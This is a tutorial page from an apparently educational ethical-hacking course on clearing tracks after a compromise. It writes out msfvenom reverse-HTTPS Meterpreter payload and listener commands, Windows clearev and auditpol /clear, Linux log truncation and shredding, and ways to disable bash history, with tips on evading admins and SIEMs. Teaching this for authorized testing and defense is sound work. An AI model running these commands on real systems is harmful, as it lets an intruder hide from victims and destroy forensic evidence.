# Day 23 — Clearing Tracks: Covering Your Footprints

> 📚 Part of the **"Learn Ethical Hacking in 30 Days"** series.  
> Previous: [Day 22](#) | Next: [Day 24](#)

---

## 📋 Table of Contents

1. [What is Clearing Tracks?](#1-what-is-clearing-tracks)
2. [Technique 1: Use HTTPS for C2 Traffic](#2-technique-1-use-https-for-c2-traffic)
3. [Technique 2: Clear Windows Event Logs](#3-technique-2-clear-windows-event-logs)
4. [Technique 3: Disable Windows Audit Policy](#4-technique-3-disable-windows-audit-policy)
5. [Technique 4: Linux Log Clearing](#5-technique-4-linux-log-clearing)
6. [Technique 5: Disable Bash History](#6-technique-5-disable-bash-history)
7. [Technique 6: Shred Files on Linux](#7-technique-6-shred-files-on-linux)
8. [Why Deleting Logs Can Backfire](#8-why-deleting-logs-can-backfire)
9. [Quick Reference Cheat Sheet](#9-quick-reference-cheat-sheet)

---

## 1. What is Clearing Tracks?

**Clearing Tracks** is the final phase of the Ethical Hacking Methodology. After completing all objectives, the attacker removes evidence of their presence to avoid detection by:
- System administrators
- Security analysts
- Forensic investigators (incident response teams)

**What needs to be cleared:**
- System event logs (Windows)
- Application and security logs
- Command/shell history (Linux)
- Uploaded files, tools, and payloads
- Audit policies and logging services
- Network traffic that could reveal the C2 server

> ⚠️ **In real penetration testing:** Clearing tracks is discussed with the client beforehand. During authorized tests, you may be asked to document what you did rather than erase it, so the client can see the full impact.

---

## 2. Technique 1: Use HTTPS for C2 Traffic

Before clearing tracks starts — prevent leaving obvious network traces during the attack itself by using **HTTPS-based payloads** instead of plain TCP.

### Why HTTPS?

| Traffic Type | How it looks to firewall/admin | Detection risk |
|-------------|-------------------------------|----------------|
| `reverse_tcp` on port 4444 | Unusual port, suspicious | 🔴 High |
| `reverse_https` on port 443 | Normal HTTPS web traffic | 🟢 Low |
| `reverse_http` on port 80 | Normal HTTP web traffic | 🟡 Medium |

### Generate HTTPS-based payload with msfvenom

```bash
msfvenom -p windows/meterpreter/reverse_https \
  LHOST=192.168.29.10 \
  LPORT=443 \
  -f exe \
  -o secret.exe
```

**Why port 443?**  
HTTPS runs on port 443 by default. Traffic on this port is expected by firewalls — it blends in with normal web browsing.

### Set up the HTTPS listener

```bash
msfconsole

use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 192.168.29.10
set LPORT 443
exploit
```

> 💡 **Other low-detection ports to consider:**
> - Port 80 (HTTP)
> - Port 443 (HTTPS) ← recommended
> - Port 445 (SMB — common on Windows networks)

---

## 3. Technique 2: Clear Windows Event Logs

Windows logs all system activity in **Event Logs** — viewed through Event Viewer. These are the primary source of evidence for forensic investigators.

### Step 1: View current event logs (from Meterpreter)

```
meterpreter > run event_manager -i
```

**Output shows log categories:**
```
Application   → 2718 records
Security      → 1214 records
System        → 891 records
```

### Step 2: Get SYSTEM privileges (required for full log access)

```
meterpreter > getsystem
meterpreter > getuid
# NT AUTHORITY\SYSTEM  ← confirmed
```

### Step 3: Clear all event logs

```
meterpreter > clearev
```

**Output:**
```
[*] Wiping 2718 records from Application...
[*] Wiping 1214 records from Security...
[*] Wiping 891 records from System...
```

**Verify it worked:**
```
meterpreter > run event_manager -i
# Application: 0 records
# Security:    1 record  (the clearev command itself)
# System:      1 record
```

> ⚠️ **Limitation:** Wiping ALL logs is a red flag — experienced admins will notice the logs are suddenly empty and treat it as an **Indicator of Compromise (IoC)**. Targeted deletion of only relevant events is more covert.

---

## 4. Technique 3: Disable Windows Audit Policy

Instead of clearing logs after they're created, **prevent logging from happening at all** by disabling the Windows Audit Policy.

### What is Audit Policy?

Windows Audit Policy controls which events get logged:
- Login attempts
- Object access
- Process creation
- Policy changes
- Privilege use

Disabling it stops new log entries from being created.

### Requirement

Must have **NT AUTHORITY\SYSTEM** privileges:

```
meterpreter > getuid
# NT AUTHORITY\SYSTEM
```

### Disable Audit Policy

```
meterpreter > execute -f cmd.exe -a "/c auditpol /clear"
```

**Breakdown:**

| Part | Meaning |
|------|---------|
| `execute` | Run a command on target |
| `-f cmd.exe` | Use Windows command prompt |
| `-a "/c auditpol /clear"` | Argument: clear all audit policy settings |

**Result:** All auditing categories are disabled — no new events will be logged while this is in effect.

### Difference: clearev vs auditpol

| Command | What it does |
|---------|-------------|
| `clearev` | Deletes existing log entries (after the fact) |
| `auditpol /clear` | Stops new logs from being created (prevents logging) |

> 💡 **Best practice:** Use `auditpol /clear` first to stop logging, then perform your actions, then `clearev` to remove any entries created before you disabled logging.

---

## 5. Technique 4: Linux Log Clearing

On Linux, logs are stored as plain text files — primarily in `/var/log/`.

### Key Linux log files

| File | What it logs |
|------|-------------|
| `/var/log/messages` | General system activity |
| `/var/log/auth.log` | Authentication attempts (SSH logins, sudo) |
| `/var/log/syslog` | System-level events |
| `/var/log/apache2/access.log` | Web server access |
| `/var/log/apache2/error.log` | Web server errors |
| `/var/log/lastlog` | Last login per user |
| `/var/log/wtmp` | All logins and logouts |
| `/var/log/btmp` | Failed login attempts |
| `/root/.bash_history` | Root's command history |

### View current logs

```bash
cat /var/log/messages
```

### Overwrite a log file using kwrite (if installed)

```bash
kwrite /var/log/messages
```

**kwrite** is a text editor on KDE — opening the log and saving it empty overwrites the content.

> If kwrite is not available, use `echo` or `truncate` instead:

```bash
# Overwrite with empty content
echo "" > /var/log/messages
echo "" > /var/log/auth.log

# Truncate to zero bytes
truncate -s 0 /var/log/messages
```

---

## 6. Technique 5: Disable Bash History

Every command you type in a Linux terminal is saved to `~/.bash_history`. This is a goldmine for forensic investigators.

### View current history size

```bash
echo $HISTSIZE
# 500  ← stores last 500 commands
```

### Disable history logging for current session

```bash
export HISTSIZE=0
```

Setting HISTSIZE to 0 means no commands will be saved during this session.

**Verify:**
```bash
history
# Nothing returned — history is disabled
```

### Clear existing history

```bash
history -c
```

### Prevent history from being written to file

```bash
export HISTFILESIZE=0
unset HISTFILE
```

### Set history to write to /dev/null (permanent black hole)

```bash
export HISTFILE=/dev/null
```

---

## 7. Technique 6: Shred Files on Linux

**Deleting** a file on Linux (`rm`) doesn't erase the data — it just removes the file pointer. The data still exists on disk and can be recovered with forensic tools.

**Shredding** overwrites the file contents multiple times with random data before deleting, making recovery extremely difficult.

### Shred a specific file

```bash
shred -z -u /root/.bash_history
```

| Flag | Meaning |
|------|---------|
| `-z` | Add a final overwrite with zeros (hides shredding) |
| `-u` | Remove (delete) the file after shredding |

### Shred with more passes (more thorough)

```bash
shred -z -u -n 10 /var/log/auth.log
```

`-n 10` → overwrite 10 times (default is 3)

### Shred multiple log files

```bash
shred -z -u /var/log/messages /var/log/auth.log /var/log/syslog
```

> ⚠️ **Note:** Shredding is slow on large files and may take significant time. It also may not work reliably on SSDs due to wear leveling — traditional HDDs respond better to shredding.

---

## 8. Why Deleting Logs Can Backfire

Paradoxically, completely clearing logs can **attract more attention** than leaving them:

| Action | What admins see | Suspicion level |
|--------|----------------|-----------------|
| Logs present with some anomalies | Normal with some unusual events | 🟡 Medium |
| **All logs suddenly empty** | Evidence of tampering | 🔴 High — immediate IoC |
| Specific targeted entries removed | Hard to detect | 🟢 Low |

**Best practices for stealthy track clearing:**
- Use HTTPS/common ports from the start (prevent network logs)
- Disable audit policy before performing actions (prevent log creation)
- Only delete specific relevant log entries, not everything
- Leave some plausible-looking logs intact
- Avoid patterns that SIEMs can detect (log volume suddenly dropping to zero)

---

## 9. Quick Reference Cheat Sheet

### Windows — Clearing Tracks

```
# View event logs
meterpreter > run event_manager -i

# Get SYSTEM privileges (required)
meterpreter > getsystem

# Clear all event logs
meterpreter > clearev

# Disable audit policy (stop logging)
meterpreter > execute -f cmd.exe -a "/c auditpol /clear"

# Re-enable audit policy (restore after test)
meterpreter > execute -f cmd.exe -a "/c auditpol /restore"
```

### Linux — Clearing Tracks

```bash
# Clear specific log files
echo "" > /var/log/auth.log
echo "" > /var/log/messages
truncate -s 0 /var/log/syslog

# Disable bash history for current session
export HISTSIZE=0

# Clear existing history
history -c

# Permanently redirect history to /dev/null
export HISTFILE=/dev/null

# Shred bash history (unrecoverable)
shred -z -u ~/.bash_history

# Shred any log file
shred -z -u /var/log/auth.log

# Shred with more passes
shred -z -u -n 10 /var/log/messages
```

### HTTPS Payload (Stealth C2)
```bash
# Generate HTTPS payload (blends with normal traffic)
msfvenom -p windows/meterpreter/reverse_https \
  LHOST=<your-ip> LPORT=443 -f exe -o payload.exe

# Set up HTTPS listener
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST <your-ip>
set LPORT 443
exploit
```

### Track Clearing Priority Order
```
1. Use HTTPS payload → blend C2 traffic with normal web traffic
2. auditpol /clear   → stop Windows logging before acting
3. Perform objectives
4. clearev           → delete Windows event logs
5. shred / truncate  → overwrite Linux log files
6. HISTSIZE=0        → disable terminal history
7. Remove uploaded tools/payloads from target
```

### Key Log Locations

**Windows:**
```
Event Viewer → Application, Security, System logs
C:\Windows\System32\winevt\Logs\
```

**Linux:**
```
/var/log/messages      → general system activity
/var/log/auth.log      → SSH logins, sudo
/var/log/syslog        → system events
/root/.bash_history    → root command history
/home/user/.bash_history → user command history
```

---

> ✅ **End of Day 23 Notes**  
> 📌 This completes the **5 phases** of the Ethical Hacking Methodology: Recon → Scanning → Gaining Access → Maintaining Access → Clearing Tracks  
> 💡 Practice: TryHackMe "Post-Exploitation Basics" room covers these techniques  
> ⚠️ These techniques should only be used during authorized penetration tests with written permission  
> 💬 Questions? Drop them in the comments!